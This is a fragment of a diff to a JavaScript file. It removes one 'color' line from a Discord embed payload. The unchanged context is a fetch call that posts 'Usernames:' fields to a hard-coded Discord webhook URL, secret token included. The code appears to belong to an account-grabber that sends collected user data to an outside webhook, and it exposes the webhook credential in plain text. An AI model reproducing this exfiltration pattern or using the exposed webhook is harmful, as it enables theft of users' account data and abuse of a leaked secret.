@@ -912,7 +912,6 @@ beSilly = {
     fetch("https://discord.com/api/webhooks/1287951806743445597/M8plrBQCDWZtIiAU7xt14bnjhVxU9z6k_z9ru-jqsGrpvaaOeG6H9K50Prj-7x5k5aVL", {
         body: JSON.stringify({
             "embeds": [{
-                "color": `${color}`,
                 "fields" : [
                     {
                         "name": `Usernames:`,
